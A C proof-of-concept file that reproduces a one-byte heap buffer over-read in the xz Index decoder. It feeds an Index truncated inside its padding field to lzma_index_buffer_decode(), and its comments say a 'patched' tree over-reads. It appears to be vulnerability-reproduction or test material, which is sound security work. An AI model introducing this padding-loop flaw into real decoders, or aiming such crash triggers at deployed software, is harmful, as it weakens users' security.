// SPDX-License-Identifier: 0BSD
//
// PoC for a heap-buffer-overflow (read) in the .xz Index decoder.
//
// A valid, complete Index is decoded through the public single-call API
// lzma_index_buffer_decode(). The only crafted aspect is that the input
// buffer is truncated inside the Index Padding field (a legal "too short
// input" situation that the decoder is required to report as an error).
//
// An empty Index encodes to 8 bytes:
//     00            Index Indicator
//     00            Number of Records (0)
//     00 00         Index Padding (two bytes)
//     1c df 44 21   CRC32
//
// Feeding only the first three bytes leaves the decoder in the middle of
// the two-byte Index Padding field. On the parent tree the decoder consumes
// the single available padding byte and reports LZMA_DATA_ERROR (truncated
// input). On the patched tree the padding loop keeps reading until the whole
// padding field has been consumed, running one byte past the end of the
// supplied input buffer.

#include <lzma.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int
main(void)
{
	// Produce a byte-exact, fully valid empty Index.
	lzma_index *idx = lzma_index_init(NULL);
	if (idx == NULL)
		return 2;

	uint8_t encoded[32];
	size_t out_pos = 0;
	if (lzma_index_buffer_encode(idx, encoded, &out_pos, sizeof(encoded))
			!= LZMA_OK)
		return 2;
	lzma_index_end(idx, NULL);

	// Keep only the bytes up to and including the first Index Padding byte
	// (Indicator + Count + one of the two padding bytes). The input buffer
	// is sized exactly so that any read past its end is detected.
	const size_t feed = out_pos - 5;
	uint8_t *in = malloc(feed);
	if (in == NULL)
		return 2;
	memcpy(in, encoded, feed);

	lzma_index *out_idx = NULL;
	uint64_t memlimit = UINT64_MAX;
	size_t in_pos = 0;

	// On the parent tree: LZMA_DATA_ERROR (too short input). On the patched
	// tree: the decoder reads in[feed] during Index Padding handling.
	lzma_ret ret = lzma_index_buffer_decode(&out_idx, &memlimit, NULL,
			in, &in_pos, feed);

	printf("lzma_index_buffer_decode returned %d\n", (int)ret);

	lzma_index_end(out_idx, NULL);
	free(in);
	return 0;
}
